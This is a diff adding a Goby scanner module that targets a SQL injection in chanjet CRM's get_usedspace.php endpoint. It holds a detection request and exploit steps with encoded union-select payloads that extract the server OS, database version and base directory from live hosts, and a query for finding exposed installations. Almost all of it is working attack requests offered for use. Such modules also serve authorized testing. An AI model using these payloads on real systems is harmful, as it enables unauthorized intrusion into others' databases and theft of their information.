@@ -1,0 +1,115 @@
+{
+      "Name": "chanjet CRM get_usedspace.php sql injection",
+      "Level": "3",
+      "Tags": [
+            "sqli"
+      ],
+      "GobyQuery": "title=\"畅捷CRM\"",
+      "Description": "SQL injection exists in chanjet CRM get_usedspace.php and sensitive information can be obtained through vulnerability",
+      "Product": "chanjet CRM",
+      "Homepage": "https://www.chanjet.com/",
+      "Author": "luckying1314@139.com",
+      "Impact": "<p>SQL injection exists in chanjet CRM get_usedspace.php and sensitive information can be obtained through vulnerability<br></p>",
+      "Recommendation": "<p>Please pay attention to the manufacturer's home page: <a href>https://www.chanjet.com/</a><br></p>",
+      "References": [
+            "https://gobies.org/"
+      ],
+      "HasExp": true,
+      "ExpParams": [
+            {
+                  "Name": "SQL",
+                  "Type": "select",
+                  "Value": "and%20%201%3d2%20union%20all%20select%20concat(0x5e5e21%2cconcat_ws(0x240924%2cifnull(%40%40version_compile_os%2c0x20))%2c0x215e5e) ,and%201%3d2%20union%20all%20select%20concat(0x5e5e21%2cconcat_ws(0x240924%2cifnull(version()%2c0x20))%2c0x215e5e),and%201%3d2%20union%20all%20select%20concat(0x5e5e21%2cconcat_ws(0x240924%2cifnull(%40%40basedir%2c0x20))%2c0x215e5e)"
+            }
+      ],
+      "ExpTips": {
+            "Type": "",
+            "Content": ""
+      },
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/webservice/get_usedspace.php?site_id=-1%20and%201=2%20union%20all%20select%20(md5({{{r1}}}))",
+                        "follow_redirect": true,
+                        "header": null,
+                        "data_type": "text",
+                        "data": "",
+                        "set_variable": [
+                              "r1|rand|int|8",
+                              "md1|define|md5|r1"
+                        ]
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "{{{md1}}}",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|lastbody|regex|"
+                  ]
+            }
+      ],
+      "ExploitSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/webservice/get_usedspace.php?site_id=-1%20{{{SQL}}}",
+                        "follow_redirect": true,
+                        "header": null,
+                        "data_type": "text",
+                        "data": "",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "^^!",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "!^^",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|lastbody|regex|!(.*)!"
+                  ]
+            }
+      ],
+      "PostTime": "2021-10-20 10:53:10",
+      "GobyVersion": "1.8.301"
+}
